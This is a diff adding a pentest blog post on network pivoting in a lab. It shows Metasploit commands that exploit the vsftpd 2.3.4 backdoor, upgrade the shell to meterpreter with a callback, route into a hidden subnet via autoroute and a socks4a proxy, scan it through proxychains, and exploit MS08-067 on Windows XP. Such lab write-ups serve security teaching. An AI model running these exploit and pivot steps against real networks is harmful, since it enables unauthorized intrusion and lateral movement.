@@ -1,0 +1,210 @@
+---
+title:  "Pivoting - part 2. Proxychains. Practical example."
+date:   2021-11-08 10:00:00 +0600
+header:
+  teaser: "/assets/images/20/2021-11-08_13-25.png"
+categories: 
+  - pentest
+tags:
+  - pivoting
+  - red team
+  - networking
+  - pentest
+---
+
+﷽
+
+Hello, cybersecurity enthusiasts and white hackers!           
+
+![pivoting 1](/assets/images/20/2021-11-08_13-25.png){:class="img-responsive"}         
+
+This article I will consider scenarios for attacking protected segments of the corporate network using pivoting techniques via `metasploit` framework and `proxychains`.      
+
+### Scenario
+
+Let's consider at this network topology:       
+
+![pivoting 1](/assets/images/20/pivot-topology.png){:class="img-responsive"}         
+
+> for simplicity, I chose Metasploitable as machine A and vulnerable windows xp sp3 as machine B        
+
+### enum and compromise machine A
+
+Often in a real pentest, you do not know the exact address of the vulnerable machines in network, so first I did hosts discovery:
+```bash
+nmap -sn -T4 10.10.2.0/24 -oG - | awk '/Up$/{print $2}'
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-04.png){:class="img-responsive"}         
+
+As you can see, our target is `10.10.2.15`.          
+
+Then scan:
+```bash
+nmap -Pn -sV 10.10.2.15
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-18.png){:class="img-responsive"}         
+
+
+We found a vulnerable `21` port. But in this case we will pwn machine `A` via Metasploit Framework. The Metasploit Framework from Rapid7 is one of the best-known frameworks in the area of vulnerability analysis, and is used by many Red Teams and penetration testers worldwide.     
+
+Firstly, run:
+```bash
+msfconsole
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-20.png){:class="img-responsive"}         
+
+In my case I am using `metasploit v5.0.87-dev` from my kali VM.    
+
+Exploitation:
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.10.2.15
+set RPORT 21
+run
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-21.png){:class="img-responsive"}         
+
+As you can see, we got a reverse shell session.        
+
+enum network intefaces:
+```bash
+ifconfig
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-22.png){:class="img-responsive"}         
+
+And we discovered another network `10.9.1.22/24`.          
+
+update our shell to meterpreter:
+```bash
+use post/multi/manage/shell_to_meterpreter
+set LPORT 4441
+set LHOST 10.10.2.6
+set SESSION 1
+run
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-24.png){:class="img-responsive"}         
+
+
+### access hidden network via proxy
+
+Further, according to the scenario, the attacker wants to gain access to the subnet behind the `10.9.1.0/24` interface. To do this, he needs to use a compromised host as a pivot.   
+
+Check our meterpreter session:        
+```bash
+sessions -l
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-24_1.png){:class="img-responsive"}         
+
+
+The following command can be used to create a tunnel through an existing meterpreter session:    
+```bash
+sessions -i 2
+run autoroute -s 10.9.1.0/24
+run autoroute -p
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-26.png){:class="img-responsive"}         
+
+We have added our additional route and this route will work during the meterpreter session is not closed.    
+
+In order for our tools such as nmap to work on this network, we must configure a `socks4a` proxy:     
+```bash
+use auxiliary/server/socks4a
+set SRVHOST 10.10.2.6
+set SRVPORT 8090
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-28.png){:class="img-responsive"}         
+
+
+Check:        
+```bash
+netstat -antp
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-29.png){:class="img-responsive"}         
+
+As you can see the proxy has been created immediately and you can see our current meterpreter session `10.10.2.6:4441`.     
+
+Now we configure `proxychains`. Using the `proxychains` utility, any TCP connection can be sent to the destination via TOR, SOCKS4, SOCKS5, HTTP/HTTPS proxy. Let's make a small update in the settings file `/etc/proxychains.conf`:    
+```bash
+nvim /etc/proxychains.conf
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_12-31.png){:class="img-responsive"}         
+
+
+Then, scan via `proxychains` and `nmap`:         
+```bash
+proxychains4 nmap -sT -p21,22,135,139,445 10.9.1.0/24 2>&1 | grep 'OK'
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_13-10.png){:class="img-responsive"}         
+
+### exploit and access machine B
+
+scan machine `B`:
+```bash
+proxychains4 nmap -Pn -sT -sV 10.9.1.12
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_13-12.png){:class="img-responsive"}         
+
+so, machine OS is `Microsoft Windows XP`
+
+check port `445` for vulnerability:
+```bash
+proxychains4 nmap -Pn -sT -sV --script=*smb-vuln* 10.9.1.12
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_13-09.png){:class="img-responsive"}         
+
+is vulnerable to `ms08-067`.
+
+Run in `metasploit` again:          
+```bash
+use exploit/windows/smb/ms08_067_netapi
+set payload windows/shell/bind_tcp
+set RHOSTS 10.9.1.12
+set RHOST 10.9.1.12
+set LPORT 4447
+run
+```
+
+![pivoting 1](/assets/images/20/2021-11-08_13-23.png){:class="img-responsive"}         
+
+Here we used the bind shell, so it's not necessary to create the reverse route.        
+
+![pivoting 1](/assets/images/20/2021-11-08_13-25.png){:class="img-responsive"}         
+
+**So, the machine B has been pwned :)**
+
+### conclusion
+
+the attacker discovered secret network by following the steps below.
+
+- attacker got an access to the `machine A (10.10.2.15)` which was on same network with attacker via exploitation `vsftpd 2.3.4` on port `21`          
+- then he realise that `machine A` has 2 network interfaces         
+- access hidden network via `autoroute` in meterpreter session to `machine A`       
+- create `socks4a` proxy         
+- then attacker scan ports on new discovered network `10.9.1.0/24`         
+- scan ports on `10.9.1.12`           
+- `machine B` have vulnerable `smb` on port `445`                  
+- successfully exploit `ms08-067` on `machine B`                   
+- final       
+
+[pivoting via metasploit](https://www.offensive-security.com/metasploit-unleashed/pivoting/)          
+[metasploit](https://www.metasploit.com/)            
+[proxychains](https://github.com/haad/proxychains)       
+
+> This is a practical case for educational purposes only.      
+
+Thanks for your time, happy hacking and good bye!    
+*PS. All drawings and screenshots are mine*             
